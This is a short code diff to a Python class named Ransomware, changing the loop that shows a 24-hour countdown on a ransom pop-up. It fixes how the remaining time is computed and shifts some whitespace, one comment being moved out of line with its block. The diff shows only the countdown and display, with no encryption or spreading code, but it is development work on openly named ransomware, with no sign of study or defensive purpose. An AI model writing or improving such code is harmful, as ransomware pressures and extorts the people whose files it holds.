@@ -246,12 +246,12 @@ class Ransomware:
 
 
         while remaining_time > 0:
-            # Format the remaining time as hours, minutes and seconds
+        # Format the remaining time as hours, minutes and seconds
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time%3600) // 60)
             seconds = int(remaining_time % 60)
 
-            
+
 
 
             # Text to be displayed on the pop up
@@ -262,7 +262,7 @@ class Ransomware:
 
             # Update the remaining time
             elapsed_time = time.time() - start_time
-            remaining_time = remaining_time - elapsed_time
+            remaining_time = 86400 - elapsed_time
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
